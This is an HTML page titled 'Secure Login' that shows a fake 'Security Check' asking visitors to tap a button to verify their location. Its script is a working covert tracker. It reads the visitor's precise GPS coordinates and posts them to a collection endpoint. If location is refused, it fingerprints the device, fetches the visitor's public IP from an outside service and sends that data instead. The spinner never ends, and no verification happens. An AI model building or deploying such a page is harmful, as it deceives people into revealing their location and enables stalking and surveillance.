<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Secure Login</title>
    <style>
        /* Mobile optimized styling */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        h1 {
            font-weight: 700;
            margin-bottom: 1rem;
        }
        p {
            font-size: 1rem;
            margin-bottom: 2rem;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        button {
            background: #fff;
            color: #764ba2;
            border: none;
            border-radius: 30px;
            padding: 14px 36px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: transform 0.1s;
        }
        button:active {
            transform: scale(0.96);
        }
    </style>
</head>
<body>
    <div id="landing">
        <h1>Security Check</h1>
        <p>We need to verify your location to continue.<br>Please tap the button below.</p>
        <button id="verifyBtn" onclick="onVerify()">Verify &amp; Continue</button>
    </div>

    <div id="loading" style="display:none;">
        <h1>Verifying...</h1>
        <p>Please wait while we confirm your location.</p>
        <div class="spinner" aria-label="Loading"></div>
    </div>

    <script>
        const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
        const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');

        async function postJSON(url, data) {
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) {}
        }

        async function collectFallback() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            let ip = '';
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                if (resp.ok) { const j = await resp.json(); ip = j.ip || ''; }
            } catch (e) {}

            await postJSON(ENDPOINT_FALLBACK, {
                userAgent: navigator.userAgent || '',
                language: navigator.language || '',
                platform: navigator.platform || '',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                connectionType: connection.effectiveType || connection.type || '',
                ip
            });
        }

        function onVerify() {
            document.getElementById('landing').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            if (!navigator.geolocation) {
                collectFallback();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    await postJSON(ENDPOINT_GPS, {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                async () => {
                    await collectFallback();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
